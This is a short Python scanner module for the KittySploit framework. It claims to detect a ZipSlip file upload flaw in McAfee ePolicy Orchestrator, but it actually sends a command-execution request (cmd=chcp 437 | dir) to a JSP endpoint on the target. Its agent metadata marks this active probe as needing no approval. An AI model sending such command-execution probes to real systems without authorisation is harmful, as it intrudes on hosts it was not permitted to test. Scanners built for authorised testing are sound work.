#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""McAfee ePolicy Orchestrator (ePO) is vulnerable to a ZipSlip vulnerability which allows arbitrary file upload ."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'McAfee ePolicy Orchestrator - Arbitrary File Upload Detection',
        'description': 'McAfee ePolicy Orchestrator (ePO) is vulnerable to a ZipSlip vulnerability which allows arbitrary file upload when archives are unpacked if the names of the packed files are not properly sanitized. An attacker can create archives with files containing "../" in their names, making it possible to upload arbitrary files to arbitrary directories or overwrite existing ones during archive extraction.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'mcafee', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://swarm.ptsecurity.com/vulnerabilities-in-mcafee-epolicy-orchestrator/'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/stat.jsp?cmd=chcp+437+%7c+dir', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('text/html',)
        body_regexes = ('Volume (in drive [A-Z]|Serial Number) is',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="McAfee ePolicy Orchestrator - Arbitrary File Upload detected",
                path='/stat.jsp?cmd=chcp+437+%7c+dir',
            )
            return True
        return False

